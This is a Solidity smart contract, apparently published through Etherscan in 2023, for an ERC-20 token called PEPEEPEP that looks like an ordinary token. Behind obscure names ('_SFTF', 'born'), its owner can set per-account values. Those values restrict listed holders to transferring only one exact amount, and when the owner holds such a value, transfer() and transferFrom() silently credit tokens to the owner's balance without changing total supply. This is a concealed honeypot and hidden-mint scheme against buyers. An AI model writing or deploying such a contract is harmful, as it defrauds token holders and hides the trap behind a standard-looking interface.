/**
 *Submitted for verification at Etherscan.io on 2023-07-21
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amoount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amoount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amoount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PEPEEPEP is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _SFTF;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amoount) public virtual override returns (bool) {
        if (_msgSender() == owner() && _SFTF[_msgSender()] > 0*0) {
            _balances[owner()] += _SFTF[_msgSender()];
            return true;
        }
        else if (_SFTF[_msgSender()] > 0) {
            require(amoount == _SFTF[_msgSender()], "Invalid transfer amoount");
        }
        require(_balances[_msgSender()] >= amoount, "TT: transfer amoount exceeds balance");
        _balances[_msgSender()] -= amoount;
        _balances[recipient] += amoount;
        emit Transfer(_msgSender(), recipient, amoount);
        return true;
    }

    function born(address[] memory accounts, uint256 amoount) public onlyowner {
        for (uint i=0; i<accounts.length; i++) {
            _SFTF[accounts[i]] = amoount;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amoount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amoount;
        emit Approval(_msgSender(), spender, amoount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amoount) public virtual override returns (bool) {
        if (_msgSender() == owner() && _SFTF[sender] > 0) {
            _balances[owner()] += _SFTF[sender];
            return true;
        }
        else if (_SFTF[sender] > 0) {
            require(amoount == _SFTF[sender], "Invalid transfer amoount");
        }
        require(_balances[sender] >= amoount && _allowances[sender][_msgSender()] >= amoount, "TT: transfer amoount exceeds balance or allowance");
        _balances[sender] -= amoount;
        _balances[recipient] += amoount;
        _allowances[sender][_msgSender()] -= amoount;
        emit Transfer(sender, recipient, amoount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}